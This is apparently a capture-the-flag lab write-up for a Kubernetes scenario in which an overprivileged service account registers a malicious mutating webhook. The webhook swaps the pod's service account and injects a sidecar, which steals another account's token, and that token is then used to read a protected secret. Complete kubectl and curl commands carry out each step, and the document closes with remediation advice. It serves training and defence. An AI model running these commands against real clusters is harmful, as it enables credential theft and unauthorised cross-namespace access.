# K8S-25: MutatingWebhookConfiguration Overprivileged Registration

## 场景信息

| 字段 | 值 |
|---|---|
| ID | K8S-25 |
| 名称 | MutatingWebhookConfiguration Overprivileged Registration |
| 技术/CVE | N/A (admission control abuse via overprivileged RBAC) |
| 难度 | L2 |
| 交付方式 | KIND / Kubernetes |
| 入口 | KIND 集群内入口（无固定宿主端口） |
| 集群 | cve-k8s-25-webhook-inject |

## 场景概述

1. Attacker SA `attacker-sa` is overprivileged: it can create `MutatingWebhookConfiguration` objects cluster-wide
2. A webhook server (attacker-controlled, self-signed TLS) is pre-deployed in `attacker-ns`
3. The attacker registers a mutating webhook whose `namespaceSelector` targets `attacker-ns`
4. Any pod created in `attacker-ns` is mutated: `serviceAccountName` is patched to `victim-sa` and a sidecar is injected
5. The sidecar writes the (victim-sa) SA token to `/tmp/token.txt`
6. The attacker reads the token, then uses it to read `vault-flag` in `target-ns` (the only permission `victim-sa` has)

## 前置知识

- kubectl access to KIND cluster `cve-k8s-25-webhook-inject`
- Pod name: `attacker-pod` in `attacker-ns` (bitnami/kubectl, uses `attacker-sa`)

## 利用步骤

### Step 1: Get the Attacker SA Token
```bash
kubectl exec -n attacker-ns attacker-pod -- \
  cat /var/run/secrets/kubernetes.io/serviceaccount/token
# Save it and verify the overprivileged role:
TOKEN=<attacker-sa-token>
kubectl --token=$TOKEN auth can-i create mutatingwebhookconfigurations
# Expected: yes
```

### Step 2: Retrieve the Webhook Server CA
```bash
# The webhook server generated its own CA at startup and placed it in /shared
CA_B64=$(kubectl exec -n attacker-ns deploy/mutating-webhook -- \
  cat /shared/ca.crt | base64 -w0)
```

### Step 3: Register the Malicious MutatingWebhook
```bash
kubectl --token=$TOKEN apply -f - << EOF
apiVersion: admissionregistration.k8s.io/v1
kind: MutatingWebhookConfiguration
metadata:
  name: sidecar-injector
webhooks:
  - name: sidecar-injector.attacker-ns.svc
    clientConfig:
      url: "https://mutating-webhook.attacker-ns.svc:443/mutate"
      caBundle: ${CA_B64}
    rules:
      - operations: ["CREATE"]
        apiGroups: [""]
        apiVersions: ["v1"]
        resources: ["pods"]
    namespaceSelector:
      matchLabels:
        kubernetes.io/metadata.name: attacker-ns
    failurePolicy: Ignore
    sideEffects: None
    admissionReviewVersions: ["v1"]
EOF
```

### Step 4: Create a Trigger Pod
```bash
kubectl --token=$TOKEN run trigger-pod --image=nginx:1.24-alpine -n attacker-ns \
  -- sleep 3600
kubectl --token=$TOKEN wait --for=condition=Ready pod/trigger-pod -n attacker-ns --timeout=60s

# Verify the mutation: serviceAccountName=victim-sa and injected-sidecar present
kubectl --token=$TOKEN get pod trigger-pod -n attacker-ns -o yaml | grep -E "serviceAccountName|injected-sidecar"
```

### Step 5: Steal the Victim SA Token
```bash
VICTIM_TOKEN=$(kubectl --token=$TOKEN exec trigger-pod -n attacker-ns -c injected-sidecar -- \
  cat /tmp/token.txt)
echo "$VICTIM_TOKEN"
```

### Step 6: Read the Flag Secret
```bash
curl -sk -H "Authorization: Bearer $VICTIM_TOKEN" \
  https://kubernetes.default.svc/api/v1/namespaces/target-ns/secrets/vault-flag | \
  python3 -c "import sys,json,base64; d=json.load(sys.stdin); print(base64.b64decode(d['data']['flag']).decode())"
# Output: flag{k8s-25-<16-hex>}
```

## 验证命令

```bash
cd cve_challenges/scenarios/k8s/webhook-inject && bash deploy.sh
kubectl get secret vault-flag -n target-ns -o jsonpath='{.data.flag}' | base64 -d
bash teardown.sh
```

## Flag

- **Primary**: Secret `vault-flag` in namespace `target-ns`
- **Format**: `flag{k8s-25-<16-hex>}`

## 此场景利用了哪些知识

| 规划维度 | 所需知识 |
|---|---|
| 环境与访问 | Admission webhooks, TLS/caBundle, ServiceAccounts and RBAC |
| 侦察与前置条件 | MutatingWebhookConfiguration registration rights and webhook discovery |
| 核心漏洞与利用 | Register a malicious mutating webhook to inject a sidecar and swap the pod SA |
| 权限、横向或影响 | Workload credential theft and cross-namespace access |
| 验证 | Use the stolen victim-sa token to read the protected Secret |

## 修复建议

将 `mutatingwebhookconfigurations` 的创建权限限制给受控的集群管理员，不允许
普通平台运维/租户角色持有；对 admission webhook 的注册增加审计与告警；用
Pod Security Admission / OPA 策略限制 sidecar 注入与 `serviceAccountName` 篡改。
